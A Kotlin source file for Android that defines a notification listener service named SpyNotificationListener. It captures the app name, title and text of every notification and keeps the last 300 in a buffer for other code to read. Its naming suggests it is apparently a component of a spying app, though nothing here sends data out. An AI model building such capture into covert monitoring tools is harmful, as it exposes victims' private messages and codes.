package com.you.spy.service

import android.app.Notification
import android.service.notification.NotificationListenerService
import android.service.notification.StatusBarNotification

class SpyNotificationListener : NotificationListenerService() {

    companion object {
        @Volatile private var buffer = ArrayDeque<String>()
        @Volatile var instance: SpyNotificationListener? = null

        fun recent(limit: Int): String = synchronized(buffer) {
            buffer.takeLast(limit).joinToString("\n").ifEmpty { "none" }
        }
    }

    override fun onListenerConnected() { instance = this }
    override fun onListenerDisconnected() { instance = null }

    override fun onNotificationPosted(sbn: StatusBarNotification) {
        val ex = sbn.notification?.extras ?: return
        val title = ex.getCharSequence(Notification.EXTRA_TITLE)?.toString().orEmpty()
        val text = ex.getCharSequence(Notification.EXTRA_TEXT)?.toString().orEmpty()
        if (title.isBlank() && text.isBlank()) return
        val line = "${sbn.packageName} | $title | $text"
        synchronized(buffer) {
            buffer.addLast(line)
            while (buffer.size > 300) buffer.removeFirst()
        }
    }
}
